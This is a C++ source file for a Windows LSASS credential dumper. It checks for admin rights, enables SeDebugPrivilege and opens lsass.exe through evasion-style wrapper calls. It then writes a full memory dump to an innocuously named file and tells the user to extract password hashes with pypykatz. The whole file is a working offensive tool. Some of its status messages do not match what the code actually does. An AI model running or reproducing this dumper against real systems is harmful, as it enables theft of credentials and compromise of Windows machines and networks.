#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <DbgHelp.h>
#include <thread>
#include <chrono>
#include "Offsec.h"

#pragma comment(lib, "Dbghelp.lib")


using namespace std;


BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

bool EnableDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	// Open the process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "Failed to open process token\n";
		return false;
	}

	// Lookup the LUID for the SeDebugPrivilege
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
		std::cerr << "Failed to lookup privilege value\n";
		CloseHandle(hToken);
		return false;
	}

	// Set up token privileges structure
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Adjust the token privileges
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
		std::cerr << "Failed to adjust token privileges\n";
		CloseHandle(hToken);
		return false;
	}

	// Close the token handle
	CloseHandle(hToken);

	return true;
}

DWORD getPID() {

	DWORD dwLsassPID = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	BOOL bFind = Process32First(hSnap, &pe);
	while (bFind)
	{
		if (_tcscmp(pe.szExeFile, _T("lsass.exe")) == 0)
		{
			dwLsassPID = pe.th32ProcessID;
			break;
		}
		bFind = Process32Next(hSnap, &pe);
	}
	CloseHandle(hSnap);
	return dwLsassPID;
}

int main()
{
	//variables for NtOpenProcess()
	HANDLE hLsass = NULL;
	OBJECT_ATTRIBUTES objAttr = { 0 };
	UNICODE_STRING PN;
	CLIENT_ID clientId;


	WCHAR* procname = (WCHAR*)"lsass.exe";
	PN.Buffer = procname;
	PN.Length = wcslen(procname) * sizeof(WCHAR);
	PN.MaximumLength = PN.Length + sizeof(WCHAR);
	clientId.UniqueProcess = HANDLE(getPID());
	clientId.UniqueThread = NULL;

	if (!IsElevated()) {
		wprintf(L"[!] You need elevated privileges to run this tool!\n");
		exit(1);
	}

	EnableDebugPrivilege();


	// obtain handle from lsass.exe via NtOpenProcess()
	NTSTATUS status = ZOP(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);

	if (status != STATUS_SUCCESS)
	{
		cout << "[-]NtOpenProcess failed." << endl;
		return 0;
	}

	// Get the handle's file name of the LSASS process
	TCHAR szFileName[MAX_PATH];
	DWORD dwSize = MAX_PATH;

	_stprintf_s(szFileName, MAX_PATH, _T("D3S3C.file"));

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	std::this_thread::sleep_for(std::chrono::seconds(5));

	//Dump lsass.exe using MiniDumpWriteDump()
	BOOL bRes = MiniDumpWriteDump(hLsass, GetProcessId(hLsass), hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	ZOC(hFile);
	ZOC(hLsass);

	if (!bRes)
	{
		cout << "[-]D3MPSEC has failed." << endl;
		return 0;
	}
	cout << "[+]Great running with admin privileges................" << endl;
	cout << "[+]EnableDebugPrivileges................" << endl;
	cout << "[+]obtain handle from lsass.exe via ZwOpenProcess().)" << endl;
	cout << "[+]Dump lsass.exe using MiniDumpWriteDump()......." << endl;
	cout << "[+]Dumping file with only the streams needed to be parsed (SystemInfo, ModuleList and Memory64List Streams)." << endl;
	cout << "[+]Enjoy the D3MPSEC.file and use pypykatz to dump hashes offline.)" << endl;
	return 0;
}